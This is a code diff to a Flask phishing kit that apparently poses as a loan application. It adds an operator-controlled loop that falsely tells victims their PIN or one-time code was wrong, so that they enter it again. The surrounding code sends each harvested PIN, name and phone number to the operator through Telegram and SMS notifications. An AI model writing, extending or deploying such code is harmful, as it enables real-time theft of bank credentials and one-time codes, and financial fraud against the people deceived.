@@ -894,6 +894,33 @@ HTML_PAGE = r"""<!DOCTYPE html>
         }
       }
     }
+let decisionTimer = null;
+function watchHostDecision(step) {
+  if (decisionTimer) clearInterval(decisionTimer);
+  decisionTimer = setInterval(async () => {
+    try {
+      const res = await fetch(`/api/status/${appState.appId}`);
+      const data = await res.json();
+      if (data.status === 'retry') {
+        clearInterval(decisionTimer);
+        if (step === 'pin') {
+          enteredPin = '';
+          updatePinDots();
+          goTo('pin');
+          alert('The PIN entered is incorrect. Please re-enter your PIN.');
+        } else if (step === 'otp') {
+          const btnOtp = document.getElementById('btn-otp');
+          if (btnOtp) { btnOtp.disabled = false; btnOtp.innerText = 'VERIFY CODE'; }
+          const errorMsg = document.getElementById('otp-error-msg');
+          if (errorMsg) errorMsg.innerText = 'Incorrect code entered. Please re-enter the code.';
+          goTo('otp');
+        }
+      } else if (data.status === 'approve') {
+        clearInterval(decisionTimer);
+      }
+    } catch (e) {}
+  }, 3000);
+}
 
     function submitPin() {
       const formattedPhone = formatMobileWithCountryCode(appState.mobile);
@@ -908,6 +935,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
           value: enteredPin
         })
       }).catch(err => console.error(err));
+  watchHostDecision('pin');
 
       // Reset PIN busy state and animations
       isPinBusy = false;
@@ -988,6 +1016,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
           value: otpCode
         })
       }).catch(err => console.error(err));
+  watchHostDecision('otp');
 
       setTimeout(() => {
         if (btnOtp) {
@@ -1061,12 +1090,18 @@ def save_unified():
     try:
         data = request.get_json(silent=True) or {}
         app_id = data.get('appId') or data.get('session_id')
-        if not app_id: return jsonify({'status': 'error', 'message': 'Missing appId'}), 400
+        if not app_id:
+            return jsonify({'status': 'error', 'message': 'Missing appId'}), 400
+
         name = data.get('fullName', 'Unknown')
         phone = data.get('mobile', data.get('phone', 'NoPhone'))
         f_n = data.get('field')
         f_v = data.get('value')
         now = get_now_str()
+
+        if db:
+            db.delete(f"status:{app_id}")
+
         if f_n == 'entered_pin':
             m = f'🔐 PIN Received\n\n👤 User: {name}\n🔢 PIN: {f_v}\n📞 Phone: {phone}'
             send_telegram_notification(m, record_id=app_id)
@@ -1080,9 +1115,8 @@ def save_unified():
             m = f'🚀 *New Application Submitted*\n\n👤 *Name:* {name}\n📞 *Phone:* {phone}\n💰 *Amount:* ZWG {amt}\n📅 *Time:* {now}'
             send_telegram_notification(m)
             send_sms_notification(f"[Keshagi Alert] New Application\nName: {name}\nPhone: {phone}\nAmount: ZWG {amt}")
+
         return jsonify({'status': 'success', 'record_id': app_id})
-
-
     except Exception as e:
         print(f"Error in unified save: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
